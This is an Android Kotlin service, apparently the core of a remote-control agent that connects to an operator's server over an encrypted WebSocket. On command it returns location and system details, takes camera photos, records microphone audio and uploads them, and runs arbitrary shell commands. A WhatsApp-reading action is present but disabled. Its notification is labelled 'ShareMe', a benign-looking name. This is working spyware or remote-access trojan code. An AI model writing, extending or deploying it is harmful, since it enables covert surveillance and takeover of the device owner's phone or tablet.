package id.khamimzarr.tabletagent

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleService
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import okio.ByteString.Companion.toByteString
import org.json.JSONObject
import java.io.File
import java.net.URLEncoder
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class AgentService : LifecycleService() {

    companion object {
        const val ACTION_START = "id.khamimzarr.tabletagent.START"
        const val ACTION_STOP = "id.khamimzarr.tabletagent.STOP"
        private const val CHANNEL_ID = "agent"
        private const val NOTIF_ID = 42
        const val VERSION = BuildConfig.VERSION_NAME

        @Volatile var running = false
        @Volatile var status = "berhenti"
            private set

        private val http by lazy {
            OkHttpClient.Builder()
                .pingInterval(25, TimeUnit.SECONDS)
                .connectTimeout(15, TimeUnit.SECONDS)
                .readTimeout(0, TimeUnit.MILLISECONDS)
                .retryOnConnectionFailure(true)
                .build()
        }
    }

    private val worker = Executors.newSingleThreadExecutor()
    private val ui = Handler(Looper.getMainLooper())
    private var ws: WebSocket? = null
    private var attempts = 0
    private var token = ""
    private var server = ""
    private var manualStop = false
    private lateinit var actions: Actions
    private var pendingReconnect: Runnable? = null

    override fun onCreate() {
        super.onCreate()
        actions = Actions(this, this)
        createChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)

        if (intent?.action == ACTION_STOP) {
            shutdown()
            return START_NOT_STICKY
        }

        val cfg = ConfigStore(this)
        server = cfg.server
        token = cfg.token
        manualStop = false
        running = true

        startForegroundCompat(buildNotification("menghubungkan…"))
        connect()
        return START_STICKY
    }

    /** status + pesan galat terakhir, supaya layar app bisa menampilkan sebabnya. */
    private fun fail(where: String, t: Throwable) {
        val msg = t.message ?: t.javaClass.simpleName
        Log.e(TAG, "$where: $msg", t)
        update("$where: $msg")
        try { File(filesDir, "agent.log").appendText("${System.currentTimeMillis()} $where: $msg\n") } catch (_: Exception) {}
    }

    override fun onDestroy() {
        manualStop = true
        running = false
        try { ws?.close(1000, "service stop") } catch (_: Exception) {}
        worker.shutdownNow()
        super.onDestroy()
    }

    // ---------- koneksi ----------

    private fun connect() {
        if (manualStop) return
        if (server.isBlank() || token.isBlank()) {
            update("token/server kosong")
            return
        }
        val url = server.trimEnd('/') + "/?token=" + URLEncoder.encode(token, "UTF-8")
        update("menghubungkan…")
        val req = Request.Builder().url(url).build()

        ws = http.newWebSocket(req, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                attempts = 0
                update("online")
                Log.i(TAG, "terhubung")
                send(webSocket, JSONObject()
                    .put("client", "tablet_agent_android")
                    .put("version", VERSION)
                    .toString())
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                val plain = Crypto.decrypt(token, text)
                if (!plain.contains("\"action\"")) return
                worker.execute {
                    try {
                        handle(webSocket, plain)
                    } catch (e: Exception) {
                        Log.e(TAG, "handle gagal", e)
                    }
                }
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                scheduleReconnect("gagal: " + (t.message ?: t.javaClass.simpleName))
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                scheduleReconnect("terputus ($code)")
            }
        })
    }

    private fun scheduleReconnect(reason: String) {
        if (manualStop) return
        attempts++
        val wait = minOf(attempts * 5L, 60L)
        update("$reason, coba lagi ${wait}s")
        pendingReconnect?.let { ui.removeCallbacks(it) }
        val r = Runnable { connect() }
        pendingReconnect = r
        ui.postDelayed(r, wait * 1000)
    }

    // ---------- dispatch aksi ----------

    private fun handle(socket: WebSocket, raw: String) {
        val p = try { JSONObject(raw) } catch (e: Exception) { return }
        val action = p.optString("action")
        val msgId: Long? = if (p.has("message_id") && !p.isNull("message_id")) p.optLong("message_id") else null
        Log.i(TAG, "aksi: $action")

        when (action) {
            "get_system_info" -> reply(socket, msgId, actions.systemInfo())

            "get_location" -> reply(socket, msgId, actions.location())

            "take_photo" -> {
                val front = p.optInt("camera_id", 0) == 1
                val bytes = actions.photo(front)
                if (bytes != null && bytes.isNotEmpty()) {
                    socket.send(bytes.toByteString())
                    reply(socket, msgId, "media terkirim (${bytes.size} bytes)")
                } else {
                    reply(socket, msgId, "gagal ambil media: kamera tidak merespons")
                }
            }

            "record_audio" -> {
                val dur = p.optInt("duration", 10).coerceIn(1, 120)
                val bytes = actions.record(dur)
                if (bytes != null && bytes.isNotEmpty()) {
                    socket.send(bytes.toByteString())
                    reply(socket, msgId, "rekaman ${dur}s terkirim (${bytes.size} bytes)")
                } else {
                    reply(socket, msgId, "gagal rekam: mikrofon tidak merespons / izin ditolak")
                }
            }

            "play_alarm" -> reply(socket, msgId, actions.alarm(p.optString("text", "Alarm")))

            "test_cmd" -> reply(socket, msgId, actions.shell(p.optString("command")))

            "read_wa" -> reply(socket, msgId, "fitur read_wa dinonaktifkan")

            else -> reply(socket, msgId, "aksi tak dikenal: $action")
        }
    }

    private fun send(socket: WebSocket, json: String) {
        try { socket.send(Crypto.encrypt(token, json)) } catch (e: Exception) { Log.e(TAG, "kirim gagal", e) }
    }

    private fun reply(socket: WebSocket, msgId: Long?, text: String) {
        val o = JSONObject().put("result", text)
        if (msgId != null) o.put("message_id", msgId)
        send(socket, o.toString())
    }

    // ---------- notifikasi ----------

    private fun createChannel() {
        val nm = getSystemService(NotificationManager::class.java)
        if (nm.getNotificationChannel(CHANNEL_ID) == null) {
            nm.createNotificationChannel(
                NotificationChannel(CHANNEL_ID, "ShareMe", NotificationManager.IMPORTANCE_LOW).apply {
                    description = "Koneksi agen kendali perangkat"
                    setShowBadge(false)
                }
            )
        }
    }

    private fun buildNotification(text: String): Notification {
        val open = PendingIntent.getActivity(
            this, 0, Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("ShareMe")
            .setContentText(text)
            .setSmallIcon(R.drawable.ic_stat_agent)
            .setOngoing(true)
            .setContentIntent(open)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private fun startForegroundCompat(n: Notification) {
        if (Build.VERSION.SDK_INT >= 34) {
            var types = ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
            if (granted(Manifest.permission.CAMERA)) types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
            if (granted(Manifest.permission.RECORD_AUDIO)) types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            if (granted(Manifest.permission.ACCESS_FINE_LOCATION)) types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            try {
                startForeground(NOTIF_ID, n, types)
                return
            } catch (e: Exception) {
                // tipe gabungan bisa ditolak kalau salah satu izinnya belum aktif;
                // turun ke SPECIAL_USE saja sebelum menyerah.
                fail("foreground gabungan ditolak", e)
                startForeground(NOTIF_ID, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE)
                return
            }
        }
        startForeground(NOTIF_ID, n)
    }

    private fun granted(perm: String) =
        ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED

    private fun update(text: String) {
        status = text
        try {
            getSystemService(NotificationManager::class.java)
                .notify(NOTIF_ID, buildNotification(text))
        } catch (_: Exception) {}
    }

    private fun shutdown() {
        manualStop = true
        running = false
        attempts = 0
        pendingReconnect?.let { ui.removeCallbacks(it) }
        pendingReconnect = null
        try { ws?.close(1000, "stop") } catch (_: Exception) {}
        ws = null
        update("berhenti")
        stopForeground(STOP_FOREGROUND_REMOVE)
        stopSelf()
    }
}

private const val TAG = "TabletAgent"
